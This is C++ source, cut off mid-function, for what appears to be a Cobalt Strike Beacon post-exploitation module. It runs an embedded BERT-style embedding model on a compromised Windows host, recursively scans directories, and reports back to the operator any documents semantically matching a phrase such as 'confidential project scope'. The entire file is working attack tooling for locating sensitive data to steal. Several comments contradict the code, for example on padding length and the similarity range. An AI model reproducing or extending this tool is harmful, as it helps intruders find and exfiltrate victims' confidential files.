#include "pch.h"

#define SECURITY_WIN32 // must be defined for Security.h

#include <Security.h>
#include <stdio.h>
#include <intrin.h>
#include <compressapi.h>

#include <iomanip>
#include <vector>
#include <string>
#include <sstream>
#include <unordered_map>
#include <numeric>
#include <cstdint>
#include <cstddef>
#include <cmath>
#include <cctype>

#include <winrt/Windows.AI.MachineLearning.h>
#include <winrt/Windows.Storage.h>
#include <winrt/Windows.Storage.Streams.h>

using namespace winrt;
using namespace Windows::AI::MachineLearning;
using namespace Windows::Storage;
using namespace Windows::Storage::Streams;
using namespace Windows::Foundation::Collections;
using namespace Windows::Foundation::Collections;

#pragma comment(lib, "user32")
#pragma comment(lib, "ntdll")
#pragma comment(lib, "Secur32")
#pragma comment(lib, "cabinet")

struct TokenizedInput {
    std::vector<int64_t> input_ids;
    std::vector<int64_t> offsets;
};

using VocabType = std::unordered_map<std::string, int64_t>;
constexpr SIZE_T g_PAD_LENGTH = 768;

#define MAX_SEMANTIC_WINDOW 4096
#define MIN(a, b) ((a) < (b) ? (a) : (b))

/**
 * @brief Prints the hexadecimal byte representation of each float in an embedding vector.
 *
 * This function is useful for debugging by visualizing the raw memory layout of 
 * floating-point embeddings. Each float value is reinterpreted as its raw byte 
 * representation and printed in hexadecimal format (typically little-endian).
 *
 * The output is only included in builds where `N_DEBUG` is defined.
 *
 * @param embeddings A read-only vector view of floating-point embedding values.
 *
 * @note This function assumes little-endian byte order on the host system.
 * @note Output is sent via the `PRINT` macro, which should be defined elsewhere.
 *
 * @warning This function does nothing unless compiled with `N_DEBUG` defined.
 */
void DebugPrintEmbeddingAsHex(const std::vector<float>& v)
{
#ifdef _DEBUG
    PRINT("[i] Embeddings (Hex):\n");
    for (float f : v) {
        auto* bytes = reinterpret_cast<const unsigned char*>(&f);
        for (int i = 0; i < sizeof(float); ++i)
            PRINT("%02x ", bytes[i]);
    }
    PRINT("\n");
#endif
}

/**
 * @brief Returns a similarity score in the closed interval [0 .. 1].
 *
 *   1.0 -> embeddings are identical (angle 0°)
 *   0.0 -> embeddings are orthogonal, opposite, or invalid (angle = 90°)
 *   -1.0 -> embeddings are  opposite, or invalid (angle = 0°)
 *
 * @return 0.0f - 1.0f truncated per the above scale such that dissimilar embeddings are excluded
 * 
 * Any error condition (size mismatch, zero-length input, or zero-magnitude
 * vector) returns **0.0f** so downstream code can treat it as
 * a similarity.
 */
float CalculateCosineSimilarity(
    std::vector<float> embedding1,
    std::vector<float> embedding2)
{
    // Sanity checks
    if (embedding1.size() != embedding2.size() || embedding1.size() == 0)
        return 0.0f; // invalid call

    double dot = 0.0, norm1 = 0.0, norm2 = 0.0;

    for (uint32_t i = 0; i < embedding1.size(); ++i)
    {
        float v1 = embedding1.at(i);
        float v2 = embedding2.at(i);

        dot += v1 * v2;
        norm1 += v1 * v1;
        norm2 += v2 * v2;
    }

    if (norm1 == 0.0 || norm2 == 0.0)
        return 0.0f; // one or both zero vectors

    // Cosine similarity
    double cosine = dot / (std::sqrt(norm1) * std::sqrt(norm2));

    // (unused) map [-1,1] -> [0,1]
    // double sim01 = (cosine + 1.0) * 0.5;
    
    return std::max<float>(0.0f, cosine);
}

/* Usage */
void PostexUsage(){
    // Postex DLL actually receives arguments in a different order, but this string goes back to the Beacon console so we should give them to the user
    // in the order that *they* expect to enter the args
    BeaconPrintf(CALLBACK_OUTPUT, "usage: semanticSearch [arch] [pid] [root_path] [threshold] [reference_string]\n");
}

/**
 * @brief Splits a buffer of bytes into a vector of strings based on whitespace delimiters.
 *
 * This function interprets the given `unsigned char*` buffer as a UTF-8 or ASCII text stream,
 * converts it into a `std::string`, and tokenizes it into words using standard C++ whitespace rules.
 * Whitespace includes spaces, tabs, newlines, etc.
 *
 * @param buffer Pointer to the input byte buffer to be processed.
 * @param length The number of bytes in the buffer.
 * @return A vector of strings, where each string is a word extracted from the buffer.
 *
 * @note The function assumes that the buffer contains valid text data (e.g., ASCII or UTF-8).
 *       Binary or non-printable data may produce undefined or partial results.
 *
 * @example
 * @code
 * const unsigned char data[] = "this is a test";
 * auto words = SplitBufferByWhitespace(data, sizeof(data) - 1);
 * // words = ["this", "is", "a", "test"]
 * @endcode
 */
std::vector<std::string> SplitBufferByWhitespace(const unsigned char* buffer, size_t length) {
    std::vector<std::string> result;

    // Convert the unsigned char buffer to a std::string for easier processing
    std::string input(reinterpret_cast<const char*>(buffer), length);

    // Use a stringstream to split the input by whitespace
    std::stringstream ss(input);
    std::string word;

    while (ss >> word) {
        result.push_back(word);
    }

    return result;
}

/**
 * @brief Checks if a given file path has a valid file extension.
 *
 * This function extracts the file extension from the provided file path and verifies
 * whether it matches one of the allowed extensions. The comparison is case-insensitive,
 * and the set of valid extensions is predefined and limited to those supported by an
 * associated Rust FFI crate.
 *
 * Valid extensions include:
 * - .txt
 * - .pdf
 * - .html
 * - .docx
 * - .xlsx
 * - .odt
 * - .pptx
 * - .odp
 * - .doc
 *
 * @param filePath A null-terminated string representing the path to the file.
 * @return TRUE if the file has a valid extension, FALSE otherwise.
 *
 * @note The function only checks the file extension and does not validate the file's existence or contents.
 * @note The comparison is case-insensitive (e.g., ".PDF" is considered valid).
 */
BOOL IsValidFile(const char* filePath) {
    // List of valid extensions
    const std::vector<std::string> validExtensions = {
        ".txt", ".pdf", ".html", ".docx", ".xlsx", ".odt", ".pptx", ".odp", ".doc"
    };

    std::string fileStr(filePath);
    size_t dotPos = fileStr.find_last_of('.');

    if (dotPos != std::string::npos) {
        std::string extension = fileStr.substr(dotPos);
        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower); // Convert to lowercase

        // Check if the extension is in the valid extensions list
        if (std::find(validExtensions.begin(), validExtensions.end(), extension) != validExtensions.end()) {
            return TRUE;
        }
    }

    return FALSE;
}

LearningModel LoadModelFromStream(IRandomAccessStreamReference const& modelStream, ILearningModelOperatorProvider const& operatorProvider = nullptr)
{
    auto model = LearningModel::LoadFromStream(modelStream, operatorProvider);
    return model;
}

/**
 * @brief Byte-level tokenizer that maps **every single UTF-8 byte** in the
 *        first element of @p batch_texts to a vocabulary id.
 *
 * Behaviour is intentionally parallel to `TokenizeTexts` but simpler:
 *   - Adds `[CLS]` at position 0 and `[SEP]` at the end.
 *   - For each byte `b` in the input string
 *         – looks up the 1-byte string `std::string(1, b)` in @p vocab;
 *         – on miss or id = `VOCAB_LIMIT`, emits `[UNK]`.
 *   - Stops early if emitting the next token would exceed max_length
 *     *(room is always kept for the final `[SEP]`)*.
 *   - Pads with `[PAD]` out to `g_PAD_LENGTH` if the result is shorter.
 *
 * @param batch_texts  Only the first element is processed.
 * @param vocab        Same WordPiece vocabulary used elsewhere; must include
 *                     `[PAD]`, `[UNK]`, `[CLS]`, `[SEP]`, plus 1-byte entries.
 * @param max_length   Hard limit (incl. special tokens).  Defaults to the same
 *                     value as the WordPiece tokenizer for drop-in symmetry.
 *
 * @return `TokenizedInput {input_ids, offsets={0}}` where `input_ids.size()`
 *         equals `g_PAD_LENGTH` (512) after padding/truncation.
 *
 * @note  This treats **each UTF-8 byte** independently; multi-byte characters
 *        therefore expand to multiple token ids.
 */
TokenizedInput SimpleTokenizeTexts(const std::vector<std::string>& batch_texts,
    const std::unordered_map<std::string, int64_t>& vocab,
    size_t max_length = 29523)
{
    const int64_t PAD_ID = vocab.at("[PAD]");
    const int64_t UNK_ID = vocab.at("[UNK]");
    const int64_t CLS_ID = vocab.at("[CLS]");
    const int64_t SEP_ID = vocab.at("[SEP]");
    const int64_t VOCAB_LIMIT = 29523;

    TokenizedInput out;
    if (batch_texts.empty()) return out;

    std::vector<int64_t> ids;
    ids.reserve(g_PAD_LENGTH);          // cheap heuristic
    ids.push_back(CLS_ID);              // [CLS]

    const std::string& text = batch_texts[0];
    for (unsigned char byte : text)
    {
        // keep space for final [SEP]
        if (ids.size() + 1 >= max_length)
            break;

        std::string key(1, static_cast<char>(byte));
        auto it = vocab.find(key);
        int64_t id = (it != vocab.end() && it->second < VOCAB_LIMIT)
            ? it->second
            : UNK_ID;
        ids.push_back(id);
    }

    // always terminate with [SEP] if there is room 
    if (ids.size() < max_length)
        ids.push_back(SEP_ID);

    // pad / truncate to fixed length expected by the model 
    if (ids.size() > max_length)
        ids.resize(max_length);
    else if (ids.size() < g_PAD_LENGTH)
        ids.resize(g_PAD_LENGTH, PAD_ID);

    out.input_ids = std::move(ids);
    out.offsets = { 0 };
    return out;
}

/**
 * @brief Tokenizes a single input string into a fixed-length sequence of WordPiece token IDs.
 *
 * This function tokenizes the first string in the provided `batch_texts` vector using a BERT-style
 * WordPiece vocabulary. The input is lowercased, split into whitespace-separated words, and each
 * word is further split into subword tokens using greedy longest-match-first logic. Special tokens
 * `[CLS]` and `[SEP]` are added to the beginning and end of the sequence, respectively.
 *
 * If a subword is not found in the vocabulary, the `[UNK]` token is used. The output is padded with
 * `[PAD]` tokens to a fixed length (`max_length`), or truncated if it exceeds the limit. To protect
 * against malformed vocabularies, token IDs are clamped to a maximum value (`VOCAB_LIMIT`).
 *
 * @param batch_texts A vector of input strings; only the first string is tokenized.
 * @param vocab An unordered map representing the WordPiece vocabulary, mapping subword strings to integer IDs.
 *              Must contain entries for `[PAD]`, `[UNK]`, `[CLS]`, and `[SEP]`.
 * @param max_length The maximum number of tokens allowed in the sequence, including special tokens. Default is 29523.
 * @return A `TokenizedInput` struct containing:
 *         - `input_ids`: A vector of `max_length` token IDs, padded or truncated as needed.
 *         - `offsets`: A single-element vector containing the starting index `0` (required by model input format).
 *
 * @note This function enforces a maximum vocabulary ID (`VOCAB_LIMIT`) of 29523. If a token ID exceeds this value,
 *       it is replaced with `[UNK]`.
 * @note Only one string is tokenized per call; the batch interface is retained for compatibility.
 * @note The output vector is guaranteed to be exactly `max_length` in size.
 *
 * @example
 * @code
 * std::vector<std::string> texts = {"The quick brown fox jumps over the lazy dog."};
 * TokenizedInput tokens = TokenizeTexts(texts, vocab, 32);
 * // tokens.input_ids = [101, 1996, 4248, 2829, ..., 102, 0, 0, 0]  (CLS + tokens + SEP + padding)
 * // tokens.offsets   = [0]
 * @endcode
 */
TokenizedInput TokenizeTexts(const std::vector<std::string>& batch_texts, const std::unordered_map<std::string, int64_t>& vocab, size_t max_length = 29523) {
    const int64_t PAD_ID = vocab.at("[PAD]");
    const int64_t UNK_ID = vocab.at("[UNK]");
    const int64_t CLS_ID = vocab.at("[CLS]");
    const int64_t SEP_ID = vocab.at("[SEP]");
    const int64_t VOCAB_LIMIT = 29523; // Was having issues with vocab.txt, hard coded this check here to make sure ids within expected range
    TokenizedInput tokenized_input;

    if (batch_texts.empty()) {
        return tokenized_input;
    }

    const std::string& text = batch_texts[0];
    std::vector<int64_t> token_ids;
    token_ids.push_back(CLS_ID); // [CLS]

    std::istringstream iss(text);
    std::string word;
    while (iss >> word) {
        std::transform(word.begin(), word.end(), word.begin(), ::tolower);

        size_t start = 0;
        while (start < word.size()) {
            size_t end = word.size();
            std::string subword;
            bool found = false;

            while (start < end) {
                subword = word.substr(start, end - start);
                if (start > 0) subword = "##" + subword;

                auto it = vocab.find(subword);
                if (it != vocab.end()) {
                    // Check if we can still add one more token + final [SEP]
                    if (token_ids.size() + 1 >= max_length) {
                        goto END_TOKENIZATION;
                    }

                    auto id = it->second;
                    if (id >= VOCAB_LIMIT)
                        id = UNK_ID;
                    token_ids.push_back(id);

                    start = end;
                    found = true;
                    break;
                }
                --end;
            }

            if (!found) {
                if (token_ids.size() + 1 >= max_length) {
                    goto END_TOKENIZATION;
                }
                token_ids.push_back(UNK_ID);
                break;
            }
        }
    }

END_TOKENIZATION:

    if (token_ids.size() > max_length) {
        token_ids.resize(max_length - 1);       // truncate if somehow too long
    }
    else if (token_ids.size() < g_PAD_LENGTH) {
        token_ids.resize(g_PAD_LENGTH, PAD_ID); // pad if length less than the longest
    }

    tokenized_input.input_ids = token_ids;
    tokenized_input.offsets.push_back(0);
    return tokenized_input;
}

/**
 * @brief Binds tokenized input data to a machine learning model using the Windows ML API.
 *
 * This function prepares and binds the tokenized input data (such as token IDs and optional offsets)
 * to a `LearningModelBinding` object. The input is expected to be in the form of a `TokenizedInput`
 * structure containing flattened `input_ids` and optional `offsets`.
 *
 * The function creates `TensorInt64Bit` tensors from the input data and binds them to the model's
 * input names:
 * - `"input_ids"`: A 1D tensor of token IDs representing the tokenized input text.
 * - `"offsets"` (optional): A 1D tensor of offsets marking the start of each individual sequence in `input_ids`.
 *
 * @param binding A reference to the `LearningModelBinding` object used to bind input data to the model.
 * @param tokenized_input A `TokenizedInput` struct containing the tokenized input data and optional offsets.
 *
 * @note The `offsets` field in `TokenizedInput` is optional. If it is empty, no offsets tensor will be bound.
 * @note This function assumes the model expects inputs named `"input_ids"` and optionally `"offsets"`.
 */
 // BindTokenizedInput  —  minimal & correct for single-bag inference
VOID BindTokenizedInput(
    LearningModelBinding& binding,
    const TokenizedInput& tokenized_input)
{
    const int64_t seq_len = static_cast<int64_t>(tokenized_input.input_ids.size());

    /* input_ids : shape [seq_len] */
    auto input_ids_tensor = TensorInt64Bit::CreateFromArray(
        { seq_len },
        tokenized_input.input_ids);
    binding.Bind(L"input_ids", input_ids_tensor);

    /* offsets : one value per bag (no sentinel) */
    std::vector<int64_t> offsets = tokenized_input.offsets;   // usually {0}
    if (offsets.empty()) offsets = { 0 };                     // default

    auto offsets_tensor = TensorInt64Bit::CreateFromArray(
        { static_cast<int64_t>(offsets.size()) },
        offsets);
    binding.Bind(L"offsets", offsets_tensor);
}

/**
 * @brief Loads a Windows ML `LearningModel` from an in-memory buffer.
 *
 * This function creates an `InMemoryRandomAccessStream`, writes the contents of the provided
 * byte buffer to it, and uses it to load a `LearningModel`. This is useful for scenarios
 * where a model is embedded in memory (e.g., loaded from a resource or received over a network)
 * rather than read from disk.
 *
 * @param buffer A pointer to the model data in memory.
 * @param buffer_size The size of the model data in bytes.
 * @return A `LearningModel` object loaded from the provided buffer.
 *
 * @throws std::invalid_argument if the buffer is null or the size is zero.
 * @throws hresult_error if loading the model from the stream fails.
 *
 * @note The function uses Windows Runtime APIs such as `InMemoryRandomAccessStream`, `DataWriter`,
 *       and `RandomAccessStreamReference`. It blocks on the async `StoreAsync()` call to ensure
 *       all data is written before loading.
 *
 * @example
 * @code
 * auto model = LoadModelFromBuffer(myModelData, myModelSize);
 * @endcode
 */
LearningModel LoadModelFromBuffer(UCHAR* buffer, SIZE_T buffer_size) {
    // Ensure buffer is not null
    if (!buffer || buffer_size == 0) {
        return NULL;
    }

    // Create an InMemoryRandomAccessStream
    InMemoryRandomAccessStream memoryStream;

    // Write the buffer to the stream
    DataWriter writer(memoryStream);
    writer.WriteBytes(array_view(buffer, buffer + buffer_size));
    writer.StoreAsync().get();
    memoryStream.Seek(0); // Reset the stream position to the beginning

    // Wrap the stream in a RandomAccessStreamReference
    auto streamReference = RandomAccessStreamReference::CreateFromStream(memoryStream);

    // Load and return the LearningModel
    return LearningModel::LoadFromStream(streamReference);
}

/**
 * @brief Parses a BERT-style vocabulary from a UTF-8 encoded buffer into a token-to-ID map.
 *
 * This function reads the contents of a UTF-8 encoded vocabulary file stored in memory as a `const UCHAR*`
 * and constructs an unordered map of tokens to their corresponding indices based on line order.
 * Each non-empty line in the buffer is treated as a distinct token, and its index is assigned incrementally
 * starting from zero. This format is compatible with WordPiece tokenizers used in BERT models.
 *
 * @param buffer A pointer to the UTF-8 encoded contents of a vocabulary file (e.g., `vocab.txt`).
 * @return A `VocabType` (`std::unordered_map<std::string, int64_t>`) mapping tokens to their integer IDs.
 *
 * @note This function assumes that the input buffer is null-terminated and contains line-separated tokens.
 * @note It is typically used to initialize a vocabulary for use in a BERT tokenizer.
 *
 * @example
 * @code
 * extern const UCHAR* vocab_data;
 * VocabType vocab = ParseVocabFromBuffer(vocab_data);
 * int64_t cls_id = vocab.at("[CLS]");
 * @endcode
 */
VocabType ParseVocabFromBuffer(const UCHAR* buffer) {
    const char* raw = reinterpret_cast<const char*>(buffer);
    std::istringstream stream(raw);

    VocabType vocab;
    std::string line;
    int64_t index = 0;

    while (std::getline(stream, line)) {
        // Remove trailing carriage return (\r) if present
        if (!line.empty() && line.back() == '\r') {
            line.pop_back();
        }

        if (!line.empty()) {
            vocab[line] = index++;
        }
    }
    
    PRINT("Vocab Length: %llu", vocab.size());

    return vocab;
}

/**
 * @brief Extracts a fixed-length **sentence embedding** from a Windows ML
 *        `TensorFloat`.
 *
 * The ONNX models used with Windows ML may emit either
 *  - a single pooled embedding with shape **[1 × 768]**, or
 *  - token-level embeddings with shape **[seq_len × 768]**.
 *
 * This helper transparently handles both cases:
 * 1. The tensor’s raw data are copied into a `std::vector<float>` so the
 *    result remains valid after the original tensor is destroyed.
 * 2. If the tensor contains *token* embeddings (`shape[0] > 1`), the function
 *    **mean-pools across the token dimension**, yielding a single 768-d
 *    vector that represents the entire sentence.
 * 3. If the tensor is already `[1 × 768]`, the data are returned unchanged.
 *
 * @param t  A `TensorFloat` produced by a Windows ML inference call, whose
 *           last dimension is the hidden-size (e.g. 768 for BERT/BGE).
 *
 * @return   A `std::vector<float>` of length 768 containing the sentence
 *           embedding. The vector is **always** one embedding per call, never
 *           token-wise output.
 *
 * @note The copy-out (`GetMany`) happens once, so the function is safe even if
 *       the caller immediately releases `t` or its parent `LearningModelResult`.
 *
 * @example
 * @code
 * auto results  = session.Evaluate(binding, L"Run");
 * auto tensor   = results.Outputs().Lookup(L"embeddings").as<TensorFloat>();
 * auto sent_vec = GetSentenceEmbedding(tensor);  // length == 768
 * @endcode
 */
std::vector<float> GetSentenceEmbedding(const TensorFloat& t)
{
    auto shape = t.Shape();          // e.g. [1, 768]  OR [seq_len, 768]
    auto buffer = t.GetAsVectorView();
    std::vector<float> out(buffer.Size());
    buffer.GetMany(0, out);           // copy once, safe after tensor destruction

    if (shape.Size() == 2 && shape.GetAt(0) > 1) {
        // mean-pool across tokens
        const size_t tokens = static_cast<size_t>(shape.GetAt(0));
        const size_t dims = static_cast<size_t>(shape.GetAt(1));
        std::vector<float> pooled(dims, 0.0f);
        for (size_t i = 0; i < tokens; ++i)
            for (size_t d = 0; d < dims; ++d)
                pooled[d] += out[i * dims + d];
        for (float& v : pooled) v /= static_cast<float>(tokens);
        return pooled;
    }
    return out; // outputs in the correct shape
}

/**
 * @brief Evaluates a machine learning model on a batch of input texts and returns the output embeddings.
 *
 * This function performs end-to-end model inference using the Windows ML API. It tokenizes the input
 * texts, binds them to the model, executes the inference session on the CPU, and extracts the output
 * tensor named `"embeddings"` as an `IVectorView<float>`.
 *
 * @param model A reference to a preloaded `LearningModel` to be evaluated.
 * @param batch_texts A vector of input strings to be tokenized and passed to the model.
 * @param parsed_vocab Buffer containing a parsed vocab
 * @return An `IVectorView<float>` representing the flattened output embeddings produced by the model.
 *
 * @note The function assumes the model has an input named `"input_ids"` (and optionally `"offsets"`)
 *       and produces an output named `"embeddings"`.
 * @note Tokenization is done using `TokenizeTexts`, and input binding is performed using `BindTokenizedInput`.
 * @note The model is evaluated on the CPU (`LearningModelDeviceKind::Cpu`).
 *
 * @throws hresult_error if any part of the model evaluation pipeline fails.
 *
 * @example
 * @code
 * LearningModel model = LoadModelFromBuffer(buffer, buffer_size);
 * std::vector<std::string> inputs = {"hello", "world"};
 * auto embeddings = EvaluateModel(model, inputs);
 * @endcode
 */
std::vector<float> EvaluateModel(LearningModel const& model, std::vector<std::string> const& batch_texts, VocabType parsed_vocab) {

    // Tokenize the input
    TokenizedInput tokenized_input = SimpleTokenizeTexts(batch_texts, parsed_vocab);

    // Create the device (CPU in this case)
    LearningModelDevice device(LearningModelDeviceKind::Cpu);

    // Create the session
    LearningModelSession session(model, device);

    // Bind the tokenized input
    LearningModelBinding binding(session);
    BindTokenizedInput(binding, tokenized_input);

    // Evaluate the model
    auto results = session.Evaluate(binding, L"RunId");

    // Extract the output and return it as IVectorView<float>
    auto tensor = results.Outputs()
        .Lookup(L"embeddings")
        .as<TensorFloat>();

    return GetSentenceEmbedding(tensor);
}

/**
 * @brief Computes the semantic similarity between two input strings using a machine learning model.
 *
 * This function evaluates a given `LearningModel` on two input strings to obtain their
 * embedding representations. It then calculates and returns the cosine similarity between the two
 * embeddings, which reflects how semantically similar the inputs are.
 *
 * Internally, the function:
 * - Tokenizes each input string.
 * - Uses `EvaluateModel` to run the model and obtain output embeddings.
 * - Prints the raw embeddings in hexadecimal format via `DebugPrintEmbeddingAsHex`.
 * - Computes and returns the cosine similarity using `CalculateCosineSimilarity`.
 *
 * @param model A `LearningModel` capable of producing embeddings from tokenized input text.
 * @param string_1 The first input string.
 * @param string_2 The second input string.
 * @param parsed_vocab Buffer containing a parsed vocab
 * @return A float value representing the cosine similarity between the two embeddings.
 *         The value ranges from -1.0 (opposite) to 1.0 (identical), with 0.0 meaning orthogonal (unrelated).
 *
 * @note The model must accept inputs in the form of tokenized text and produce an output named `"embeddings"`.
 * @note The printed hexadecimal output is for debugging purposes and only appears if compiled with `N_DEBUG` defined.
 *
 * @example
 * @code
 * float similarity = SemanticComparison(model, "hello world", "hi universe");
 * std::cout << "Cosine Similarity: " << similarity << std::endl;
 * @endcode
 */
float SemanticComparison(LearningModel model, std::string string_1, std::string string_2, VocabType parsed_vocab){

    // Example input batch
    std::vector<std::string> text_1 = {string_1};
    std::vector<std::string> text_2 = {string_2};

    // Evaluate the model and get embeddings
    std::vector<float> embeddings_1 = EvaluateModel(model, text_1, parsed_vocab); // Reference string

    std::vector<float> embeddings_2 = EvaluateModel(model, text_2, parsed_vocab);
    float cosine  = CalculateCosineSimilarity(embeddings_1, embeddings_2);    // CSS higher is more similar

    // Print the embeddings as hexadecimal, one byte at a time
    DebugPrintEmbeddingAsHex(embeddings_1);
    DebugPrintEmbeddingAsHex(embeddings_2);

    // Return similarity of the embeddings
    return cosine;
}

/**
 * @brief Computes semantic similarity between a reference phrase and a
 * longer target text by sliding a *word-level* window across the target.
 *
 * Behaviour
 * ---------
 * • If the reference contains the same number of words as (or more words
 *   than) the target, the function falls back to a direct comparison via
 *   `SemanticComparison`.
 * • Otherwise it:
 *     1. Embeds the reference phrase once.
 *     2. Splits the target into whitespace-separated words.
 *     3. Slides a fixed-width window equal to the reference’s word-count
 *        across the target, advancing by *stride* words each step
 *        (default = 1).
 *     4. Embeds each window slice, calculates cosine similarity against the
 *        reference embedding, and keeps the highest score.
 *
 * @param model       Pre-loaded Windows ML model.
 * @param reference   Phrase being searched for (typically shorter).
 * @param target      Larger text to search within.
 * @param stride      Number of whole words to move the window each step
 *                    (0 -> 1 word).
 * @param parsed_vocab Parsed WordPiece vocabulary.
 * @param threshold   Early-exit threshold (>= 0 & <= 1).
 * @return            Maximum similarity in [0 .. 1]; 0 if error/empty.
 */
float SemanticComparisonSliding(
    const LearningModel& model,
    const std::string& reference,
    const std::string& target,
    VocabType            parsed_vocab,
    float                threshold = 0.8f,
    size_t               stride = 0)
{
    // Split words by space characters
    auto split_words = [](const std::string& s) {
        std::vector<std::string> out;
        std::istringstream       iss(s);
        std::string              w;
        while (iss >> w) out.push_back(std::move(w));
        return out;
        };

    const auto ref_words = split_words(reference);
    const auto tgt_words = split_words(target);
    const size_t win_len = ref_words.size();
    const size_t tgt_len = tgt_words.size();

    // Sanity check
    if (win_len == 0 || tgt_len == 0) {
        return 0.0f;
    }

    if (win_len >= tgt_len) {
        return SemanticComparison(model, reference, target, parsed_vocab);
    }

    if (stride == 0) {
        stride = 1; // default = 1 word
    }

    // reference embedding once
    std::vector<float> ref_emb =
        EvaluateModel(model, { reference }, parsed_vocab);

    float max_similarity = 0.0f;

    // Sliding window over words
    for (size_t pos = 0; pos + win_len <= tgt_len; pos += stride)
    {
        /* join window words back into a space-separated slice */
        std::string slice;
        slice.reserve(reference.size() + win_len);   // rough heuristic
        for (size_t i = 0; i < win_len; ++i) {
            if (i) slice.push_back(' ');
            slice += tgt_words[pos + i];
        }

        std::vector<float> slice_emb =
            EvaluateModel(model, { slice }, parsed_vocab);

        const float sim = CalculateCosineSimilarity(ref_emb, slice_emb);
        if (sim > max_similarity) {
            max_similarity = sim;
        }

        if (max_similarity >= 1.0f - 1e-6f || max_similarity > threshold) {
            break;                        // early match
        }
    }

    return max_similarity;
}


/**
 * @brief Decompresses LZMS-compressed data using the Windows Compression API.
 *
 * This function takes a buffer of compressed data and decompresses it using the
 * LZMS compression algorithm. It allocates memory for the decompressed output and returns
 * both the pointer to the decompressed data and its size via output parameters.
 *
 * @param compressed_data Pointer to the input buffer containing compressed data.
 * @param compressed_size Size of the compressed data buffer, in bytes.
 * @param decompressed_data Pointer to a `UCHAR*` that will receive the address of the newly allocated
 *                          buffer containing the decompressed data.
 * @param decompressed_size Pointer to a `SIZE_T` that will receive the size of the decompressed data.
 * @return `TRUE` if decompression succeeds, `FALSE` otherwise.
 *
 * @note The function uses `HeapAlloc` to allocate memory for the decompressed data.
 *       The caller is responsible for freeing the memory using `HeapFree`.
 *
 * @note This function uses the Windows Compression API (`CreateDecompressor`, `Decompress`, `CloseDecompressor`)
 *       and is specific to the Windows platform.
 *
 * @note This function's primary purpose to decompress the model
 *
 * @warning If the function returns `FALSE`, `*decompressed_data` will be `NULL`. Always check the return value
 *          before using the output buffer.
 *
 * @example
 * @code
 * UCHAR* output = nullptr;
 * SIZE_T output_size = 0;
 * if (DecompressData(input_data, input_size, &output, &output_size)) {
 *     // Use output...
 *     HeapFree(GetProcessHeap(), 0, output);
 * }
 * @endcode
 */
BOOL DecompressData(const UCHAR *compressed_data, SIZE_T compressed_size, UCHAR **decompressed_data, SIZE_T *decompressed_size) {
    // Initialize the decompressor
    DECOMPRESSOR_HANDLE decompressor = NULL;
    BOOL bResult                     = FALSE;

    // Create Decompressor
    if (!CreateDecompressor(COMPRESS_ALGORITHM_LZMS, NULL, &decompressor)) {
        PRINT("Failed to create decompressor (Error Code: %lu)\n", GetLastError());
        goto Cleanup;
    }

    // Get the decompressed size
    if (!Decompress(decompressor, compressed_data, compressed_size, NULL, 0, decompressed_size)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            PRINT("Failed to calculate decompressed size (Error Code: %lu)\n", GetLastError());
            goto Cleanup;
        }
    }

    // Allocate memory for decompressed data
    *decompressed_data = (UCHAR *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *decompressed_size);
    if (!*decompressed_data) {
        PRINT("Failed to allocate memory for decompressed data\n");
        goto Cleanup;
    }

    // Perform the decompression
    if (!Decompress(decompressor, compressed_data, compressed_size, *decompressed_data, *decompressed_size, decompressed_size)) {
        PRINT("Failed to decompress data (Error Code: %lu)\n", GetLastError());
        goto Cleanup;
    }

    bResult = TRUE;

Cleanup:

    // if we bResult is false (ie we failed) and we allocated a buffer, free it
    if(!bResult && *decompressed_data != NULL){
        HeapFree(GetProcessHeap(), 0, *decompressed_data);
    }

    // destroy the decompressor
    if(decompressor != NULL){
        // Clean up the decompressor
        CloseDecompressor(decompressor);
    }

    return bResult;
}

/**
 * @brief Recursively traverses a directory and performs semantic similarity comparisons on valid files.
 *
 * This function walks through a directory tree starting from the specified root path and evaluates each
 * valid file against a reference string using a machine learning model. For each file:
 * - It validates the file extension using `IsValidFile`.
 * - Extracts textual content via `extract_text`.
 * - Computes cosine similarity between the extracted text and the reference string using `SemanticComparison`.
 * - If the similarity exceeds the given threshold, it reports the match via `BeaconPrintf`.
 *
 * @param model A `LearningModel` capable of generating embeddings for semantic similarity.
 * @param reference_semantic_string The string to compare each file’s content against semantically.
 * @param threshold A float between 0 and 1 representing the similarity threshold for reporting matches.
 * @param root_search_directory A null-terminated C-string path to the root directory to begin traversal.
 * @param parsed_vocab Buffer containing a parsed vocab
 * @return TRUE if the operation completes successfully, FALSE if an error occurs (e.g., access denied or I/O failure).
 *
 * @note This function only considers files with supported extensions (as defined in `IsValidFile`).
 * @note Text extraction is performed using an external function `extract_text`, and memory is released with `free_extracted_text`.
 * @note The function will stop early and return FALSE if any subdirectory traversal or file operation fails.
 *
 * @warning Assumes extracted text is valid UTF-8/ASCII. Non-text content may cause undefined behavior.
 * @warning All printed output is truncated to 64 characters of the extracted string for readability.
 *
 * @example
 * @code
 * LearningModel model = LoadModelFromBuffer(buffer, size);
 * SemanticSearchDirectoryContents(model, "confidential project scope", 0.85f, "C:\\Documents\\Reports");
 * @endcode
 */
BOOL SemanticSearchDirectoryContents(LearningModel model, std::string reference_semantic_string, VocabType parsed_vocab, float threshold, const CHAR* root_search_directory) {
    std::string path(root_search_directory);

    // Optional query string per the BGE documentation
    std::string query("Represent this sentence for searching relevant passages: ");

    // Ensure the path ends with a backslash
    if (path.back() != '\\') {
        path += '\\';
    }

    // Prepare the search path with wildcard
    std::string searchPath = path + "*";

    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    do {
        // Skip "." and ".." entries
        if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
            continue;
        }

        std::string fullPath = path + findFileData.cFileName;
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Recurse into subdirectories
            if (!SemanticSearchDirectoryContents(model, (query + reference_semantic_string), parsed_vocab, threshold, fullPath.c_str())) {
                FindClose(hFind);
                return FALSE;
            }
        } else {
            // Call IsValidFile on the current file
            if (!IsValidFile(fullPath.c_str())) {
                FindClose(hFind);
                return FALSE;
            }

            // extract text from file
            const unsigned char* extracted_text = extract_text(fullPath.c_str(), strlen(fullPath.c_str()));
            size_t extracted_text_length = MIN(MAX_SEMANTIC_WINDOW, strlen((const char*) extracted_text));

            // convert extracted text to string
            std::string extracted_text_string((const char*) extracted_text, extracted_text_length);

            float similarity = 0.0f;

